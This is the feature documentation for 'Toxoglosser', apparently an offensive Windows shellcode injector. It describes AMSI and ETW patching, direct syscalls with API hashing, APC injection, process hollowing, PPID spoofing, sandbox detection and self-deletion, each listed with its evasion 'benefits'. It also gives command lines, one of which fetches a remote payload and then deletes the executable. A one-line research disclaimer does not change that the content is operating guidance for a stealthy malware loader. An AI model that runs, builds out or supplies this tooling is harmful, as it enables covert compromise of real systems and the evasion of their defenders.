# Enhanced Features in Toxoglosser

## Overview

This document details the enhanced features of Toxoglosser that have been implemented following the suggestions from `SUGGESTIONS.md`. These improvements significantly enhance the tool's evasion capabilities and code quality.

## 1. Advanced Direct Syscalls with API Hashing

### Implementation
- **API Hashing**: All Windows API calls now use dynamic resolution via hashed names instead of string literals
- **Fallback Mechanisms**: Maintains compatibility with standard `LazyProc` calls when direct methods are unavailable
- **Nt* Functions**: Core Windows functions now use ntdll.dll with hashed resolution

### Benefits
- Avoids API hooking detection by EDR solutions
- Bypasses common kernel32.dll monitoring
- Maintains stealth during system interactions

## 2. Enhanced Patching Techniques

### Implementation
- **NtProtectVirtualMemory Usage**: Replaced `VirtualProtect` with direct syscall to `NtProtectVirtualMemory`
- **Self-Patching**: Patches EtwEventWrite and AmsiScanBuffer functions using syscall-safe methods
- **Memory Protection**: Uses proper memory protection changes without triggering hooks

### Benefits
- Bypasses AMSI (Antimalware Scan Interface) for dynamic code analysis
- Bypasses ETW (Event Tracing for Windows) for telemetry blocking
- Avoids detection by hook-based security solutions

## 3. Advanced APC Injection

### Implementation
- **Thread Enumeration**: Full enumeration of target process threads
- **Alertable Thread Detection**: Identifies threads in alertable state for APC queueing
- **Multiple Queueing**: APCs are queued to all suitable alertable threads
- **Fallback Mechanism**: Falls back to CreateRemoteThread if no alertable threads found

### Benefits
- More reliable injection than basic CreateRemoteThread
- Better evasion of behavioral analysis
- Works against suspended processes

## 4. Payload Decryption with CLI Support

### Implementation
- **AES Decryption**: Uses AES-256-CFB for payload decryption
- **CLI Flag**: Added `-key` flag for decryption key
- **Module Integration**: Leverages `payloads` module for decryption

### Usage
```bash
.\toxoglosser.exe -file encrypted_payload.bin -key "decryptionkey123"
```

## 5. Complete Process Hollowing

### Implementation
- **Context Modification**: Uses `GetThreadContext` and `SetThreadContext` to modify execution flow
- **Suspended Process**: Creates target process in suspended state
- **Direct Execution**: Sets instruction pointer directly to shellcode address
- **Fallback Execution**: Uses NtCreateThreadEx when context modification fails

### Benefits
- True process hollowing instead of injection
- Better OPSEC for execution flow
- Harder to detect than simple injection

## 6. Comprehensive Sandbox Detection

### Implementation
- **Hardware Detection**: CPU core count, memory size checks
- **Analysis Tool Detection**: Checks for security tools in PATH
- **Timing Checks**: Sleep accuracy and RDTSC-based checks
- **VM Detection**: MAC address OUI checking, registry checks
- **Artifact Detection**: Username, machine name pattern matching

### Benefits
- Evades execution in analysis environments
- Prevents detonation in sandbox systems
- Improves operational security

## 7. Self-Deletion Functionality

### Implementation
- **CLI Flag**: Added `-selfdelete` flag for post-execution cleanup
- **MOVEFILE_DELAY_UNTIL_REBOOT**: Uses Windows API for system-level deletion
- **Batch Fallback**: Alternative deletion method for immediate cleanup

### Benefits
- Removes traces after execution
- Improves OPSEC by not leaving artifacts
- Prevents reverse engineering of the tool

## 8. PPID Spoofing

### Implementation
- **Extended Attributes**: Uses `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` for parent spoofing
- **Handle Management**: Properly manages parent process handles
- **Fallback**: Falls back to normal CreateProcess if extended attributes unavailable

### Benefits
- Spoofs parent process ID to avoid process tree analysis
- Evades EDR monitoring based on parent-child relationships
- Improves stealth in process monitoring

## 9. Dynamic String Obfuscation

### Implementation
- **Runtime Key Generation**: Uses `crypto/rand` for dynamic XOR keys
- **Key Expansion**: Expands short keys for AES encryption compatibility
- **Multiple Layers**: Combines XOR obfuscation with AES encryption

### Benefits
- Prevents static analysis detection
- Makes reverse engineering harder
- Avoids signature-based detection

## 10. Modular Architecture Improvements

### Structure
- **core/**: Core injection techniques (APC, hollowing, syscalls)
- **evasion/**: Patching and evasion techniques
- **anti/**: Sandbox and VM detection
- **utils/**: Utility functions (obfuscation, delay, API hashing)
- **payloads/**: Payload handling and encryption

### Benefits
- More maintainable codebase
- Easier to extend with new techniques
- Better separation of concerns

## Command Line Options

### Updated Flags
- `-file`: Load payload from local file
- `-url`: Fetch payload from URL
- `-key`: Decryption key for encrypted payloads
- `-pname`: Target process name
- `-pid`: Target process ID
- `-v`: Verbose output
- `-ah`: Alternative process hunting
- `-selfdelete`: Delete executable after execution

### Examples
```bash
# Standard injection with file payload
.\toxoglosser.exe -file shellcode.bin -pname explorer.exe

# Encrypted payload with decryption key
.\toxoglosser.exe -file encrypted.bin -key "mykey123" -pid 1234

# Self-deleting execution
.\toxoglosser.exe -url http://server/payload.bin -selfdelete

# Hunting mode with verbose output
.\toxoglosser.exe -v -ah
```

## Security Considerations

This tool is designed for security research purposes only. All enhanced evasion techniques are intended to demonstrate how modern malware can bypass security controls for educational purposes. This tool should only be used in authorized security testing environments.

## Building

To build with the enhanced features:

```bash
CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 go build -o toxoglosser_enhanced.exe toxoglosser.go
```